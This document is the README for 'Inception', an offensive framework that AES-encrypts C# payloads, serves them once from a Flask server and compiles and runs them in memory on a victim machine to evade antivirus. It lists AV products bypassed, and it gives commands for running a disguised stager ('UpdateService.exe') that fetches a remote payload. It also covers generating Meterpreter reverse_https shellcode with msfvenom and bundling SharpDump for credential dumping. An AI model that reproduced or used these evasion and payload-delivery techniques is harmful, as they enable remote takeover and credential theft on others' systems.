# Inception Framework

foo

Inception provides In-memory compilation and reflective loading of C# apps for AV evasion. Payloads are AES encrypted before transmission and are decrypted in memory. The payload server ensures that payloads can only be fetched a pre-determined number of times. Once decrypted, Roslyn is used to build the C# payload in memory, which is then executed using reflection.

Inception has been successful in bypassing a number of AV products. These tests were conducted on a fully patched, 64-bit Windows 10 host using Metasploit Meterpreter shellcode.

| Product        | Bypass Type           |
| ------------- |:-------------:|
| Cylance     | 32-bit shellcode injection | 
| McAfee Endpoint  Adaptive Threat Protection      | 64-bit shellcode injection | 
| Sophos Intercept X     | 64-bit shellcode injection | 
| Symantec Endpoint 14      | 64-bit shellcode injection | 
| ESET Internet Security     | 64-bit shellcode injection |

Inception is released under the MIT license. A derivative of the [SharpDump](https://github.com/GhostPack/SharpDump/)  project  is included with Inception, its licence file can be found in the SharpDump.licence file.

## Requirements

Flask (pip install Flask)
Colorama (pip install Colorama)

## Overview

Inception is comprised of three main components:

- The payload builder (inception.py)
- A payload server (server.py)
- The "stager", a .NET executable which must be launched on the victim machine. 

Payloads are built using Inception.py. Currently, two types of payload are supported:

- Shellcode
- Custom

These payload types are described in more detail below. Inception.py will guide you through the payload creation process, depending on which menu options are selected. 

Payloads are served using a Flask app (server.py). This app either serves the encrypted, pre-generated payload, or issues a redirect to a specified URL. Payloads are, by default, use-once. If an attempt to retrieve a payload which has already been used is made, the server will issue a redirect. If a non-existent payload is requested, the server will issue a redirect. 

The stager is a .NET application which fetches, decodes, compiles and executes the payload. This application must be run on the victim machine. The stager is large (~10MB) when built. 

### Usage

Generate payloads using Inception.py

```
python Inception.py

```
when firt run, Inception will generate a directory structure in ~/.inception/ containing the payload database, raw payload directory and encrypted payload directory. 

To serve payloads, run Server.py as root (Server.py listens on port 80).

```
sudo python Server.py
 * Serving Flask app "Server" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
```
Build the "RoslynLoad" .NET project, using visual studio. For 64-bit targets, the compiler MUST target x64. "Any CPU" can be used for 32-bit. 

Copy the generated EXE file to the victim machine and execute. 

```
UpdateService.exe "http://payload.server.URL/<ENCRYPTION KEY>"
```
The encryption key is displayed once a payload is generated using Inception.py

Note that a Metasploit listener must be running to receive the connect-back shell.

### Shellcode Payloads
Shellcode payloads use msfvenom to generate x86 or x64 Meterpreter shellcode. In this version, only reverse_https payloads are supported. 

x86 payloads use x86/shijata_ga_nai encoding. 
x64 payloads use x64/xor encoding. 

Generated shellcode is injected into a specified template file. Two examples have been included with this release:

- /Templates/Shellcode/ShellCode_Inject.txt
- /Templates/shellcode/ShellCode_Inject_76.txt

Template files contain a tag, which indicates where the generated shellcode should be placed:

```
byte[] shellcode = new byte[] {
     <SHELLCODE>
};

```

### Custom Payloads

Custom payloads allow arbitrary C# programs to be encrypted and loaded on the victim machine. No payload generation occurs for these templates; they must be complete C# programs. 

A modified version of [SharpDump](https://github.com/GhostPack/SharpDump) has been included with this release. 


### Creating Payloads

New payloads can be created using the following template. For Shellcode payloads, the SHELLCODE tag may be used to indicate where to place the generated shellcode.

```
Using System;
Using <other libraries>

namespace Inception
{
	class Program
	{
		//other methods as required
		
		public static void Run()
		{
			//Entrypoint code here
		}
	}
}
```
If non-standard libraries are required, the appropriate reference must be added to the Roslyn compilation code. The following examples shows the "System.IO.Compression.GZStream" reference (used by SharpDump).

```
MetadataReference[] references = new MetadataReference[]
            {
                MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Enumerable).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.IO.Compression.GZipStream).Assembly.Location)
            };
```
